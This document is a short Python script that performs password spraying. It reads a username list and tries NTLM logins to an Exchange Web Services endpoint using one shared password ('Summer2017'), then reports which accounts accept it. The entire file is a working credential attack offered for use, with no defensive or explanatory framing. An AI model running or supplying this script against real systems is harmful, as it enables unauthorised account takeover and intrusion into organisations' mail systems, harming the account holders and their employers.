import requests
from requests_ntlm import HttpNtlmAuth


def login_ntlm(userlist, webpage1, domain1, password1):
	
	file1 = open(userlist, 'r')

	for x in file1:
		session = requests.Session()
		print('Attempting login for: ' + x.rstrip() + ' : ' + password1)
		session.auth = HttpNtlmAuth(domain1 + '\\' + x.rstrip(), password1)
		attempt1 = session.get(webpage1)
		#print(attempt1.status_code)
		#print(attempt1.headers)

		if attempt1.status_code == 200:
			print("\033[1;32m[+]Successful Login for: " + x.rstrip() + ' : ' + password1 + ' \x1b[0m')
			

if __name__ == '__main__':
	login_ntlm('./userlist.txt', 'https://mail.example.com/EWS/exchange.asmx', 'DOMAIN', 'Summer2017')